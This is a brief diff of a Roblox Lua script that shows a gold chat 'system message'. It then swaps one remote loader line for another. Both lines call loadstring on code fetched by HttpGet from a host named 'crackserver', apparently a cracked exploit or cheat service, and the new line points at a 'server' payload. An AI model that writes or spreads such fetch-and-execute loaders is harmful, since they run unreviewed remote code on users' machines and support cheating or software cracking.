@@ -20,5 +20,5 @@ game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
     Font = Enum.Font.Arcade,
     Color = BrickColor.new("Gold").Color
 })
-loadstring(game:HttpGet("https://crackserver.mrelxs.repl.co/septex/client", true))()
--- damnn i didnt know this was so buggy
+loadstring(game:HttpGet("https://crackserver.mrelxs.repl.co/septex/server", true))()
+-- fuck you bugs
